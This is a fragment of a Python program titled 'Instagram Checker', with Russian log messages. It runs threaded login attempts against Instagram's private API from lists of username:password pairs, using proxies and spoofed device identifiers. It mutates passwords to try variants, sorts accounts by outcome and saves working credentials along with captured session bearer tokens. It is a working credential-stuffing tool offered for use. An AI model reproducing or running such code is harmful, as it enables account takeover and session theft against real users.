        data = f'params={quote(params_data)}&bk_client_context={quote(params_data2)}&bloks_versioning_id=9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a'
        # print(generate_user_agent())
        kwargs = {
            'api': config_values['onetab']['version_api'],
            'data': f'{data}',
            'host': domain,
            'pigeon_session_id': account_data['pigeon_session_id'],
            'x_ig_device_id': account_data['device_id'],
            'ig_android_id': account_data['android_id'],
            'user_agent': account_data['ua'],

        }
        headers = get_headers(**kwargs)

        api_url = f"https://{domain}{path}"

        req = send_request_post(api_url, data, headers, config_values, name_flow, proxies=proxy)

        if req == 'error':
            # print('error')
            lognow('произошла ошибка соединения строка возвращается речек и удаляется из блеклиста')
            return 'error', 'none'
        # logger.debug(path + ' - ' + api_url)
        # logger.debug(path + ' - ' + str(headers))
        # logger.debug(path + ' - ' + str(data))
        #
        # logger.debug(path + ' - ' + str(req.status_code))
        # logger.debug(path + ' - ' + str(req.headers))
        # logger.debug(path + ' - ' + req.text)
        try:
            string_json = req.json()["layout"]["bloks_payload"]["tree"]
        except:
            # logger.error("json")
            # logger.error(req)
            # logger.error(req.text)
            return 'error', 'none'
        string_json = str(string_json)


        if f"An unexpected error occurred. Please try logging in again." in string_json:
            lognow('unexpected error occurred - ' + account_data['username'] + f' Поток {name_flow}')
            # logger.debug(path + ' - ' + str(req.status_code))
            # logger.debug(path + ' - ' + str(req.headers))
            # logger.debug(path + ' - ' + req.text)
            return 'recheckacc', 'none'

        if f"two_step_verification" in string_json:
            lognow('two_step_verification - ' + account_data['username'] + f' Поток {name_flow}')
            # logger.debug(path + ' - ' + str(req.status_code))
            # logger.debug(path + ' - ' + str(req.headers))
            # logger.debug(path + ' - ' + req.text)
            return 'two_step_verification', 'none'

        if f"two_factor_required" in string_json:
            lognow('two_step_verification - ' + account_data['username'] + f' Поток {name_flow}')
            # logger.debug(path + ' - ' + str(req.status_code))
            # logger.debug(path + ' - ' + str(req.headers))
            # logger.debug(path + ' - ' + req.text)
            return 'two_step_verification', 'none'


        if f"Try another phone number or email" in string_json:
            lognow('INCORRECT account login - ' + account_data['username'] + f' Поток {name_flow}')
            # logger.debug(path + ' - ' + str(req.status_code))
            # logger.debug(path + ' - ' + str(req.headers))
            # logger.debug(path + ' - ' + req.text)
            return 'incorrectlogin', 'none'
        if f"Please check your username and try again." in string_json:
            lognow('INCORRECT account login - ' + account_data['username'] + f' Поток {name_flow}')
            # logger.debug(path + ' - ' + str(req.status_code))
            # logger.debug(path + ' - ' + str(req.headers))
            # logger.debug(path + ' - ' + req.text)
            return 'incorrectlogin', 'none'
        elif 'Incorrect Password: The password you entered is incorrect. Please try again.' in string_json:
            lognow('INCORRECT password - ' + account_data['username'] + f' Поток {name_flow}')
            return 'incorrectpass', 'none'
        if 'generic_error_redirect' in string_json:
            lognow('new check - ' + account_data['username'] + f' Поток {name_flow}')
            # logger.debug(path + ' - ' + str(req.status_code))
            # logger.debug(path + ' - ' + str(req.headers))
            # logger.debug(path + ' - ' + req.text)
            # time.sleep(99999)
            return 'check', 'none'
        if 'challenge_required' in string_json:
            lognow('check captcha - ' + account_data['username'] + f' Поток {name_flow}')
            # logger.debug(path + ' - ' + str(req.status_code))
            # logger.debug(path + ' - ' + str(req.headers))
            # logger.debug(path + ' - ' + req.text)
            # time.sleep(99999)
            return 'captcha', 'none'
        if 'Sorry, there was a problem with your request.' in string_json:
            lognow('problem - ' + account_data['username'] + f' Поток {name_flow}')
            # logger.debug(path + ' - ' + str(req.status_code))
            # logger.debug(path + ' - ' + str(req.headers))
            # logger.debug(path + ' - ' + req.text)

            # time.sleep(99999)
            return 'error', 'none'
        if 'Please wait a few minutes before you try again.' in string_json:
            lognow('Please wait - ' + account_data['username'] + f' Поток {name_flow}')
            # time.sleep(99999)
            return 'error', 'none'
        if 'To secure your account, we\'ve reset your password.' in string_json:
            lognow('reset your password - ' + account_data['username'] + f' Поток {name_flow}')
            # time.sleep(99999)
            return 'check', 'none'
        if f"Unmapped IG Error: This IG Error was not mapped to an Error Code" in string_json:
            lognow('IG Error - ' + account_data['username'] + f' Поток {name_flow}')
            # logger.debug(path + ' - ' + api_url)
            # logger.debug(path + ' - ' + str(headers))
            # logger.debug(path + ' - ' + str(data))
            #
            # logger.debug(path + ' - ' + str(req.status_code))
            # logger.debug(path + ' - ' + str(req.headers))
            # logger.debug(path + ' - ' + req.text)
            return 'error', 'none'
        if req.text == '':
            lognow('пустой ответ - ' + account_data['username'] + f' Поток {name_flow}')
            # time.sleep(99999)
            # logger.debug(path + ' - ' + str(req.status_code))
            # logger.debug(path + ' - ' + str(req.headers))
            # logger.debug(path + ' - ' + req.text)
            return 'error', 'none'
        # strs = req.json()
        stringreq = req.text
        pattern0 = re.compile(r'(?<="IG-Set-Authorization\\\\\\\\\\\\\\":\ \\\\\\\\\\\\\\"Bearer\ ).*?(?=\\\\\\\\\\\\\\",)')
        match = pattern0.search(stringreq)
        try:
            bearer = match.group(0)
        except AttributeError:
            logger.error(path + 'ошибка ответа - ' + str(req.status_code) + f' Поток {name_flow}')
            logger.error(path + ' - ' + str(req.headers) + f' Поток {name_flow}')
            logger.error(path + ' - ' + req.text + f' Поток {name_flow}')
            return 'error', 'none'
        # print(bearer)

        pattern0 = re.compile(r'(?<="x-ig-set-www-claim\\\\\\\\\\\\\\":\ \\\\\\\\\\\\\\").*?(?=\\\\\\\\\\\\\\",)')
        match = pattern0.search(stringreq)
        hmac = match.group(0)
        # print(hmac)

        pattern0 = re.compile(r'(?<="ig-set-ig-u-ds-user-id\\\\\\\\\\\\\\":\ ).*?(?=,)')
        match = pattern0.search(stringreq)
        ig_set_ig_u_ds_user_id = match.group(0)
        # print(ig_set_ig_u_ds_user_id)

        pattern0 = re.compile(r'(?<="ig-set-ig-u-rur\\\\\\\\\\\\\\":\ \\\\\\\\\\\\\\").*?(?=\\\\\\\\\\\\\\",)')
        match = pattern0.search(stringreq)
        Ig_Set_Ig_U_Rur = match.group(0)
        # print(Ig_Set_Ig_U_Rur)
        authdata = {
            'bearer': bearer,
            'hmac': hmac,
            'ig_set_ig_u_ds_user_id': ig_set_ig_u_ds_user_id,
            'Ig_Set_Ig_U_Rur': Ig_Set_Ig_U_Rur
        }
        account_data = {
            'username': account[0],
            'password': account[1],
            'ua': generate_user_agent(),
            'android_id': generate_android_device_id(),
            'device_id': generate_uuid(),
            'pigeon_session_id': generate_uuid('UFS-', '-0')
        }
        goodacc = f'{account_data["username"]}:{account_data["password"]}|{account_data["ua"]}|{account_data["android_id"]};{account_data["device_id"]};{generate_uuid()};{generate_uuid()}|mid={req.headers["ig-set-x-mid"]};ds_user_id={ig_set_ig_u_ds_user_id};X-MID={req.headers["ig-set-x-mid"]};IG-U-DS-USER-ID={ig_set_ig_u_ds_user_id};IG-INTENDED-USER-ID={ig_set_ig_u_ds_user_id};Authorization=Bearer {bearer};X-IG-WWW-Claim={hmac};||'
        lognow('good account - ' + account_data['username'] + f' Поток {name_flow}', True)
        return 'good', goodacc
    elif config_values['onetab']['version_api'] == '256':
        publickeyid = '64'
        publickey = 'LS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF4QzFzaDJUQUNwU2srY0FFK3dyVQprZzA0cUlVcHZpUkFvNXh0SFFaaUtCS0FaNVlDSFRPckN0K3BxR1FBREJjUVN5V2Jzb3ZPVjVzRnBrQ1lBUnp0Ci80Wm9IdDVoOUl3Q3c0NFArSVVEVS9lY1Z1Rmh0Z1RMaXkvMk9MK2VlVFM5L2YvMlBvSkI5VC9xeVUvNTVWcEoKWjJSb0xIZk1FMEdpK042ZXhKb1FEc2FGcXF5Z2R1Smt5c2F4Tm9DeUNBdC80bHlOS2xIUW84TG54TmJOaGxxbgphYTg4WExpNk4wRWduL2R5bmlKMEs0MU1CRDhwOHUycStmcHNQMlhUa3I2K2MzL05IODZleHMycW5jQXpWTStKCmljY2xjb2hWbEZyNURIZVZaREFTSlNGeTNBQWhDc1FVNHEweW1ud2RuMWw4M0VzN2JqWWI1M3IwSFhpeG9uelUKQVFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCg=='
        url = "https://i.instagram.com/api/v1/accounts/login/"

        parsed_url = urlparse(url)
        domain = parsed_url.netloc
        path = parsed_url.path
        # print(domain)
        # print(path)
        account_data = {
            'username': account[0],
            'password': account[1],
            'ua': generate_user_agent(config_values['onetab']['version_api']),
            'android_id': generate_android_device_id(),
            'device_id': generate_uuid(),
            'family_id': generate_uuid(),
            'pigeon_session_id': generate_uuid('UFS-', '-0')
        }
        # print(account_data)
        # params_data = f'{{"client_input_params":{{"device_id":"{account_data["android_id"]}","login_attempt_count":1,"secure_family_device_id":"","machine_id":"0","accounts_list":[],"auth_secure_device_id":"",#PWD_INSTAGRAM:0:{str(int(time.time()))}:{account_data["password"]}"has_whatsapp_installed":0,"password":"#PWD_INSTAGRAM:0:{str(int(time.time()))}:{account_data["password"]}","family_device_id":"{account_data["device_id"]}","fb_ig_device_id":[],"device_emails":[],"try_num":1,"event_flow":"login_manual","event_step":"home_page","headers_infra_flow_id":"","openid_tokens":{{}},"client_known_key_hash":"","contact_point":"{account_data["username"]}","encrypted_msisdn":""}},"server_params":{{"should_trigger_override_login_2fa_action":0,"is_from_logged_out":0,"username_text_input_id":"wx7zg3:52","should_trigger_override_login_success_action":0,"device_id":null,"server_login_source":"login","waterfall_id":null,"login_source":"Login","INTERNAL__latency_qpl_instance_id":199071749100444,"reg_flow_source":"login_home_native_integration_point","is_caa_perf_enabled":1,"is_platform_login":0,"credential_type":"password","caller":"gslr","INTERNAL__latency_qpl_marker_id":36707139,"family_device_id":null,"INTERNAL_INFRA_THEME":"harm_f","password_text_input_id":"wx7zg3:53","is_from_logged_in_switcher":0,"ar_event_source":"login_home_page"}}}}'
        params_data = f'SIGNATURE.{{"jazoest":"22326","country_codes":"[{{\\"country_code\\":\\"1\\",\\"source\\":[\\"default\\"]}}]","phone_id":"{account_data["family_id"]}","enc_password":"{password_encrypt(publickeyid, publickey, account_data["password"])}","username":"{account_data["username"]}","adid":"{generate_uuid()}","guid":"{account_data["device_id"]}","device_id":"{account_data["android_id"]}","google_tokens":"[]","login_attempt_count":"0"}}'
        # params_data2 = f'{{"bloks_version":"9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a","styles_id":"instagram"}}'
        # data = f'params={quote(params_data)}&bk_client_context={quote(params_data2)}&bloks_versioning_id=9fc6a7a4a577456e492c189810755fe22a6300efc23e4532268bca150fe3e27a'
        data = f'signed_body=={quote(params_data)}'
        # print(generate_user_agent())
        kwargs = {
            'api': config_values['onetab']['version_api'],
            'data': f'{data}',
            'host': domain,
            'pigeon_session_id': account_data['pigeon_session_id'],
            'x_ig_device_id': account_data['device_id'],
            'x_ig_family_id': account_data['family_id'],
            'ig_android_id': account_data['android_id'],
            'user_agent': account_data['ua'],

        }
        headers = get_headers(**kwargs)

        api_url = f"https://{domain}{path}"

        req = send_request_post(api_url, data, headers, config_values, name_flow, proxies=proxy)

        if req == 'error':
            # print('error')
            lognow('произошла ошибка соединения строка возвращается речек и удаляется из блеклиста')
            return 'error', 'none'

        # try:
        #     string_json = req.json()["layout"]["bloks_payload"]["tree"]
        # except:
        #     # logger.error("json")
        #     # logger.error(req)
        #     # logger.error(req.text)
        #     return 'error', 'none'
        # string_json = str(string_json)
        print(req.text)
        try:
            respjson = req.json()
        except:
            return 'recheckacc', 'none'
        # print(respjson)
        try:
            if respjson['message'] == "challenge_required":
                lognow('CAPTCHA account login - ' + account_data['username'] + f' Поток {name_flow}')
                # logger.debug(path + ' - ' + str(req.status_code))
                # logger.debug(path + ' - ' + str(req.headers))
                # logger.debug(path + ' - ' + req.text)
                return 'captcha', 'none'
        except KeyError:
            if respjson['status'] == "ok":
                # logger.debug(path + ' - ' + api_url)
                # logger.debug(path + ' - ' + str(headers))
                # logger.debug(path + ' - ' + str(data))
                #
                # logger.debug(path + ' - ' + str(req.status_code))
                # logger.debug(path + ' - ' + str(req.headers))
                # logger.debug(path + ' - ' + req.text + respjson['message'])


                bearer = req.headers.get('ig-set-authorization')
                hmac = req.headers.get('x-ig-set-www-claim')
                ig_set_ig_u_ds_user_id = req.headers.get('ig-set-ig-u-ds-user-id')
                Ig_Set_Ig_U_Rur = req.headers.get('ig-set-ig-u-rur')
                # stringreq = req.text
                # pattern0 = re.compile(
                #     r'(?<="IG-Set-Authorization\\\\\\\\\\\\\\":\ \\\\\\\\\\\\\\"Bearer\ ).*?(?=\\\\\\\\\\\\\\",)')
                # match = pattern0.search(stringreq)
                # try:
                #     bearer = match.group(0)
                # except AttributeError:
                #     logger.error(path + 'ошибка ответа - ' + str(req.status_code) + f' Поток {name_flow}')
                #     logger.error(path + ' - ' + str(req.headers) + f' Поток {name_flow}')
                #     logger.error(path + ' - ' + req.text + f' Поток {name_flow}')
                #     return 'error', 'none'
                # print(bearer)

                # pattern0 = re.compile(
                #     r'(?<="x-ig-set-www-claim\\\\\\\\\\\\\\":\ \\\\\\\\\\\\\\").*?(?=\\\\\\\\\\\\\\",)')
                # match = pattern0.search(stringreq)

                # print(hmac)

                # pattern0 = re.compile(r'(?<="ig-set-ig-u-ds-user-id\\\\\\\\\\\\\\":\ ).*?(?=,)')
                # match = pattern0.search(stringreq)
                # ig_set_ig_u_ds_user_id = match.group(0)
                # # print(ig_set_ig_u_ds_user_id)

                # pattern0 = re.compile(r'(?<="ig-set-ig-u-rur\\\\\\\\\\\\\\":\ \\\\\\\\\\\\\\").*?(?=\\\\\\\\\\\\\\",)')
                # match = pattern0.search(stringreq)
                # Ig_Set_Ig_U_Rur = match.group(0)
                # print(Ig_Set_Ig_U_Rur)
                authdata = {
                    'bearer': bearer,
                    'hmac': hmac,
                    'ig_set_ig_u_ds_user_id': ig_set_ig_u_ds_user_id,
                    'Ig_Set_Ig_U_Rur': Ig_Set_Ig_U_Rur
                }
                # account_data = {
                #     'username': account[0],
                #     'password': account[1],
                #     'ua': generate_user_agent(),
                #     'android_id': generate_android_device_id(),
                #     'device_id': generate_uuid(),
                #     'pigeon_session_id': generate_uuid('UFS-', '-0')
                # }
                goodacc = f'{account_data["username"]}:{account_data["password"]}|{account_data["ua"]}|{account_data["android_id"]};{account_data["device_id"]};{generate_uuid()};{generate_uuid()}|mid={req.headers["ig-set-x-mid"]};ds_user_id={ig_set_ig_u_ds_user_id};X-MID={req.headers["ig-set-x-mid"]};IG-U-DS-USER-ID={ig_set_ig_u_ds_user_id};IG-INTENDED-USER-ID={ig_set_ig_u_ds_user_id};Authorization={bearer};X-IG-WWW-Claim={hmac};||'
                lognow('good account - ' + account_data['username'] + f' Поток {name_flow}', True)
                return 'good', goodacc
        if respjson['message'] == "Invalid Parameters":
            lognow('RECHECK - ' + account_data['username'] + f' Поток {name_flow}')
            # logger.debug(path + ' - ' + str(req.status_code))
            # logger.debug(path + ' - ' + str(req.headers))
            # logger.debug(path + ' - ' + req.text)
            return 'recheckacc', 'none'
        if respjson['message'] == "Please wait a few minutes before you try again.":
            lognow('RECHECK - ' + account_data['username'] + f' Поток {name_flow}')
            # logger.debug(path + ' - ' + str(req.status_code))
            # logger.debug(path + ' - ' + str(req.headers))
            # logger.debug(path + ' - ' + req.text)
            return 'recheckacc', 'none'
        if respjson['message'] == "The username you entered doesn't appear to belong to an account. Please check your username and try again.":
            try:
                if respjson['error_type'] == "ip_block":
                    lognow('IP BLOCK - ' + account_data['username'] + f' Поток {name_flow}')
                    # logger.debug(path + ' - ' + str(req.status_code))
                    # logger.debug(path + ' - ' + str(req.headers))
                    # logger.debug(path + ' - ' + req.text)
                    return 'recheckacc', 'none'
            except:
                pass
            lognow('INCORRECT account login - ' + account_data['username'] + f' Поток {name_flow}')
            # logger.debug(path + ' - ' + str(req.status_code))
            # logger.debug(path + ' - ' + str(req.headers))
            # logger.debug(path + ' - ' + req.text)
            return 'incorrectlogin', 'none'

        if respjson['message'] == f"We couldn't find an account with the username {account_data['username'].lower()}. Check the username you entered and try again.":
            try:
                if respjson['buttons'][-1]['title'] == 'Recover Your Account':
                    lognow('INCORRECT account pass - ' + account_data['username'] + f' Поток {name_flow}')
                    return 'incorrectpass', 'none'
            except:
                pass
            lognow('INCORRECT account login - ' + account_data['username'] + f' Поток {name_flow}')
            # logger.debug(path + ' - ' + str(req.status_code))
            # logger.debug(path + ' - ' + str(req.headers))
            # logger.debug(path + ' - ' + req.text)
            return 'incorrectlogin', 'none'

        if respjson['message'] == f'The password you entered is incorrect. Please try again.':
            lognow('INCORRECT account pass - ' + account_data['username'] + f' Поток {name_flow}')
            return 'incorrectpass', 'none'

        if respjson['message'] == f'To secure your account, we\'ve reset your password. Tap \"Get help signing in\" on the login screen and follow the instructions to access your account.':
            lognow('RESET PASSWORD(CAPTCHA) account login - ' + account_data['username'] + f' Поток {name_flow}')
            # logger.debug(path + ' - ' + str(req.status_code))
            # logger.debug(path + ' - ' + str(req.headers))
            # logger.debug(path + ' - ' + req.text)
            return 'captcha', 'none'

        if 'Otherwise, all your posts and information will be deleted. Learn More' in respjson['message']:
            lognow('DELETED (CAPTCHA) account login - ' + account_data['username'] + f' Поток {name_flow}')
            # logger.debug(path + ' - ' + str(req.status_code))
            # logger.debug(path + ' - ' + str(req.headers))
            # logger.debug(path + ' - ' + req.text)
            return 'captcha', 'none'

        if respjson['message'] == f'':
            lognow('EMPTY RESPONSE - ' + account_data['username'] + f' Поток {name_flow}')
            # logger.debug(path + ' - ' + str(req.status_code))
            # logger.debug(path + ' - ' + str(req.headers))
            # logger.debug(path + ' - ' + req.text)
            return 'recheckacc', 'none'

        logger.debug(path + ' - ' + api_url)
        logger.debug(path + ' - ' + str(headers))
        logger.debug(path + ' - ' + str(data))

        logger.debug(path + ' - ' + str(req.status_code))
        logger.debug(path + ' - ' + str(req.headers))
        logger.debug(path + ' - ' + req.text + respjson['message'])

        if f"An unexpected error occurred. Please try logging in again." in string_json:
            lognow('unexpected error occurred - ' + account_data['username'] + f' Поток {name_flow}')
            # logger.debug(path + ' - ' + str(req.status_code))
            # logger.debug(path + ' - ' + str(req.headers))
            # logger.debug(path + ' - ' + req.text)
            return 'recheckacc', 'none'

        if f"two_step_verification" in string_json:
            lognow('two_step_verification - ' + account_data['username'] + f' Поток {name_flow}')
            # logger.debug(path + ' - ' + str(req.status_code))
            # logger.debug(path + ' - ' + str(req.headers))
            # logger.debug(path + ' - ' + req.text)
            return 'two_step_verification', 'none'

        if f"two_factor_required" in string_json:
            lognow('two_step_verification - ' + account_data['username'] + f' Поток {name_flow}')
            # logger.debug(path + ' - ' + str(req.status_code))
            # logger.debug(path + ' - ' + str(req.headers))
            # logger.debug(path + ' - ' + req.text)
            return 'two_step_verification', 'none'

        if f"Try another phone number or email" in string_json:
            lognow('INCORRECT account login - ' + account_data['username'] + f' Поток {name_flow}')
            # logger.debug(path + ' - ' + str(req.status_code))
            # logger.debug(path + ' - ' + str(req.headers))
            # logger.debug(path + ' - ' + req.text)
            return 'incorrectlogin', 'none'
        if f"Please check your username and try again." in string_json:
            lognow('INCORRECT account login - ' + account_data['username'] + f' Поток {name_flow}')
            # logger.debug(path + ' - ' + str(req.status_code))
            # logger.debug(path + ' - ' + str(req.headers))
            # logger.debug(path + ' - ' + req.text)
            return 'incorrectlogin', 'none'
        elif 'Incorrect Password: The password you entered is incorrect. Please try again.' in string_json:
            lognow('INCORRECT password - ' + account_data['username'] + f' Поток {name_flow}')
            return 'incorrectpass', 'none'
        if 'generic_error_redirect' in string_json:
            lognow('new check - ' + account_data['username'] + f' Поток {name_flow}')
            # logger.debug(path + ' - ' + str(req.status_code))
            # logger.debug(path + ' - ' + str(req.headers))
            # logger.debug(path + ' - ' + req.text)
            # time.sleep(99999)
            return 'check', 'none'
        if 'challenge_required' in string_json:
            lognow('check captcha - ' + account_data['username'] + f' Поток {name_flow}')
            # logger.debug(path + ' - ' + str(req.status_code))
            # logger.debug(path + ' - ' + str(req.headers))
            # logger.debug(path + ' - ' + req.text)
            # time.sleep(99999)
            return 'captcha', 'none'
        if 'Sorry, there was a problem with your request.' in string_json:
            lognow('problem - ' + account_data['username'] + f' Поток {name_flow}')
            # logger.debug(path + ' - ' + str(req.status_code))
            # logger.debug(path + ' - ' + str(req.headers))
            # logger.debug(path + ' - ' + req.text)

            # time.sleep(99999)
            return 'error', 'none'
        if 'Please wait a few minutes before you try again.' in string_json:
            lognow('Please wait - ' + account_data['username'] + f' Поток {name_flow}')
            # time.sleep(99999)
            return 'error', 'none'
        if 'To secure your account, we\'ve reset your password.' in string_json:
            lognow('reset your password - ' + account_data['username'] + f' Поток {name_flow}')
            # time.sleep(99999)
            return 'check', 'none'
        if f"Unmapped IG Error: This IG Error was not mapped to an Error Code" in string_json:
            lognow('IG Error - ' + account_data['username'] + f' Поток {name_flow}')
            # logger.debug(path + ' - ' + api_url)
            # logger.debug(path + ' - ' + str(headers))
            # logger.debug(path + ' - ' + str(data))
            #
            # logger.debug(path + ' - ' + str(req.status_code))
            # logger.debug(path + ' - ' + str(req.headers))
            # logger.debug(path + ' - ' + req.text)
            return 'error', 'none'
        if req.text == '':
            lognow('пустой ответ - ' + account_data['username'] + f' Поток {name_flow}')
            # time.sleep(99999)
            # logger.debug(path + ' - ' + str(req.status_code))
            # logger.debug(path + ' - ' + str(req.headers))
            # logger.debug(path + ' - ' + req.text)
            return 'error', 'none'
        # strs = req.json()



def editorline(config_values, logpass, try_line, incorrectlogin_check, onlylogin=False):
    if onlylogin == True:
        if config_values['onetab']['del_maildomain'] == 'ON':
            newlogin = logpass[0].split('@')[0]
            if f'{newlogin}:{logpass[-1]}' in try_line:
                # logger.debug('такая строка уже есть в попытках чека')
                return 'end', 'end'
            return newlogin, logpass[-1]
        else:
            return 'end', 'end'
    else:
        try_create_new_now = 0
        while try_create_new_now < 20:
            newlogin = logpass[0]
            new_pass = logpass[-1]
            if config_values['onetab']['del_maildomain'] == 'ON':
                choice = random.randint(0, 1)
                if not logpass[0].split('@')[0] in incorrectlogin_check:
                    if choice == 0:
                        # print(logpass)

                        # print(f'нету в списке {logpass[0].split("@")[0]} в {incorrectlogin_check}')
                        newlogin = logpass[0].split('@')[0]
                else:
                    newlogin = logpass[0]
            if config_values['onetab']['register_pas'] == 'ON':
                choice = random.randint(0, 1)
                if choice == 0:
                    new_pass = logpass[-1].upper()
                    # print("Строка в верхнем регистре:", new_pass)
                else:
                    new_pass = logpass[-1].lower()
                    # print("Строка в нижнем регистре:", new_pass)
            if not config_values['onetab']['add_symbol'] == '':
                # add_symbol = [char for char in config_values['onetab']['add_symbol']]

                symbols = list(config_values['onetab']['add_symbol'])

                random_symbol = random.choice(symbols)
                new_pass = new_pass + random_symbol
            if f'{newlogin}:{new_pass}' in try_line:
                # logger.debug('такая строка уже есть в попытках чека')
                try_create_new_now += 1
            else:
                return newlogin, new_pass
        else:
            return 'end', 'end'




async def start_work(config_values, name_flow):
    global mass_line, stop_threads, return_line, all_check, good_check, bad_check, check_check, recheck_check
    #check_check = 0
# recheck_check = 0
    # all_check = 0
    # good_check = 0
    # bad_check = 0

    stop_threads = False
    check_mass_line = 'good'

    with lock:
        lognow(f'Поток {name_flow} работает')
    # while True:
    #     with lock:
    #         lognow(f'Поток {name_flow} пашет')
    #     time.sleep(2)
    # time.sleep(2)
    while True:
        # print('while')
        if stop_threads == False:
            # time.sleep(2)
            line = []
            # print(f'Поток {name_flow}')
            # print(mass_line)
            with lock:
                # print(len(mass_line))
                if len(mass_line) == 0:
                    # print('длина списка ' + str(len(mass_line)))
                    lognow(f'Взял 10к строк Поток {name_flow}')
                    mass_line, check_mass_line = get_mass_line(config_values)
                    # print(mass_line)
                    # print(len(mass_line))
                if check_mass_line == 'emptyline':
                    # print(mass_line)
                    lognow(f'Закончился список Поток {name_flow}')
                    break
                    # print(mass_line)
                    # print(len(mass_line))
                while len(line) == 0:
                    # print('strip' + str(len(line)) + str(line))
                    # with lock:
                        # print(len(mass_line))
                    if len(mass_line) == 0:
                        lognow(f'Взял 10к строк2 Поток {name_flow}')
                        mass_line, check_mass_line = get_mass_line(config_values)
                    if check_mass_line == 'emptyline':
                        # print(mass_line)
                        lognow(f'Закончился список2 Поток {name_flow}')
                        break
                    with lock2:
                        # print('strip2' + str(len(line)) + str(line))
                        line, mass_line = get_line(config_values, mass_line)
                        # print(f'ОБРАБОТКА СТРОКИ {line}' + str(len(mass_line)) + '   ')

            if mass_line == 'emptyline':
                lognow(f'Закончился список3 Поток {name_flow}')
                break

                    # print(len('123asd'))
            # time.sleep(90000)

            # print(mass_line)
            # print(line)
            # print(len(mass_line))
            try:
                login = line[-2]
                password = line[-1]
                print(f'{login}:{password}')
            except IndexError:
                # lognow(f'Закончились строки {name_flow}')
                lognow(f'Закончились строки Поток {name_flow}')
                break
            # print(get_line())
            # print(f'логпасс - {login}:{password}')
            # time.sleep(999999)
            proxy = get_proxy(config_values)
            # print(proxy)
            #
            check_now = 0
            try_line = set()
            try_line.add(f'{login}:{password}')
            # print(try_line)
            result = ''
            all_result = []
            incorrectlogin_check = []
            login_line = login
            password_line = password
            while check_now < int(config_values['onetab']['trying_check']):
                # print('while2')
                # print(f'Поток {name_flow}')
                if not check_now == 0:
                    if all_result.count('incorrectlogin') == len(all_result):
                        login, password = editorline(config_values, [login_line, password_line], try_line, incorrectlogin_check, onlylogin=True)
                    else:
                        login, password = editorline(config_values, [login_line, password_line], try_line, incorrectlogin_check)
                    if not login == 'end':
                        lognow(f'новый логин пароль {login}:{password} Поток {name_flow}')
                    else:
                        # lognow(f'Перепробовали все попытки чека Поток {name_flow}')
                        break

                # while result == '' or result == 'repeater':
                # lognow(f'работаю с {login}:{password} Поток {name_flow}')
                result, accgood = send_login_request(proxy, [login, password], config_values, name_flow)
                all_check += 1
                if result == 'error':
                    with lock:
                        recheck_check += 1
                        add_line('line', result, f'{login}:{password}')
                    break
                if result == 'incorrectpass':
                    with lock:
                        bad_check += 1
                        add_line('incorrectpass', result, f'{login}:{password}')
                    try_line.add(f'{login}:{password}')
                    # print(try_line)
                    all_result.append(result)
                    # print(all_result)
                    check_now += 1
                # if result == 'FORANALYSE':
                #     with lock:
                #         bad_check += 1
                #         add_line('FORANALYSE', result, f'{login}:{password}')
                #     try_line.add(f'{login}:{password}')
                #     # print(try_line)
                #     all_result.append(result)
                #     # print(all_result)
                #     check_now += 1
                if result == 'incorrectlogin':
                    with lock:
                        bad_check += 1
                        add_line('incorrectlogin', result, f'{login}:{password}')
                    try_line.add(f'{login}:{password}')
                    # print(try_line)
                    all_result.append(result)
                    # print(all_result)
                    incorrectlogin_check.append(login)
                    # print(incorrectlogin_check)
                    check_now += 1
                    # print('hi')
                if result == 'check':
                    with lock:
                        check_check += 1
                        add_line('check', result, f'{login}:{password}')
                    break
                if result == 'captcha':
                    with lock:
                        check_check += 1
                        add_line('check', result, f'{login}:{password}')
                    break
                if result == 'good':
                    with lock:
                        good_check += 1
                        add_line('good', result, accgood)
                    break
                if result == 'two_step_verification':

                    with lock:
                        check_check += 1
                        add_line('check', result, f'{login}:{password}')
                    break
                if result == 'recheckacc':
                    with lock:
                        recheck_check += 1
                        add_line('recheckacc', result, f'{login}:{password}')
                    break
        else:
            with lock:
                if return_line == False:
                    for line in mass_line:
                        if line != '':
                            # with lock:
                            add_line('line', 'stop', line)
                    lognow(f'Поток {name_flow} остановился и СОХРАНИЛ СТРОКИ В ФАЙЛ')
                    return_line = True


                lognow(f'Поток {name_flow} остановился')

            break


async def startflow_and_work(config_values):
    global lock, lock2, lock3
    threads = []
    lock = Lock()
    lock2 = Lock()
    lock3 = Lock()
    if config_values['onetab']['include_statistic'] == 'ON':
        subprocess.Popen(["python", "statbot.py"])
    for i in range(int(config_values['onetab']['amount_flow'])):
        th = Thread(target=lambda: asyncio.run(start_work(config_values, i)))
        threads.append(th)
        th.start()

class ConfigWindow(Frame):

    def __init__(self, parent):
        Frame.__init__(self, parent, background="white")
        self.config = toml.load('app/config.toml')
        self.parent = parent
        self.init_ui()
        self.center_window()


    def init_ui(self):
        self.parent.title("Instagram Checker")
        self.parent.resizable(height=True, width=True)
        self.parent.iconphoto(True, PhotoImage(file='app/1.png'))
        self.parent.minsize(1300, 370)
        tabControl = ttk.Notebook(self.parent)
        tab1 = ttk.Frame(tabControl)
        tab2 = ttk.Frame(tabControl)
        tab3 = ttk.Frame(tabControl)
        tabControl.add(tab1, text='Настройки')
        tabControl.add(tab2, text='Лог')
        tabControl.pack(expand=1, fill="both")


        # Tab 1
        self.amount_flow = StringVar(value=self.config['onetab']['amount_flow'])
        self.turnon_blacklist = StringVar(value=self.config['onetab']['turnon_blacklist'])
        self.trying_check = StringVar(value=self.config['onetab']['trying_check'])
        self.version_api = StringVar(value=self.config['onetab']['version_api'])
        self.register_pas = StringVar(value=self.config['onetab']['register_pas'])
        self.add_symbol = StringVar(value=self.config['onetab']['add_symbol'])
        self.del_maildomain = StringVar(value=self.config['onetab']['del_maildomain'])
        self.format_proxy = StringVar(value=self.config['onetab']['format_proxy'])
        self.amount_repeat_one_proxy = StringVar(value=self.config['onetab']['amount_repeat_one_proxy'])
        self.amount_repeat_all_proxy = StringVar(value=self.config['onetab']['amount_repeat_all_proxy'])
        self.time_out_connection = StringVar(value=self.config['onetab']['time_out_connection'])
        self.include_statistic = StringVar(value=self.config['onetab']['include_statistic'])
        self.interval_send_statistic = StringVar(value=self.config['onetab']['interval_send_statistic'])
        self.bot_token = StringVar(value=self.config['onetab']['bot_token'])
        self.id_account = StringVar(value=self.config['onetab']['id_account'])
        self.ip_server = StringVar(value=self.config['onetab']['ip_server'])
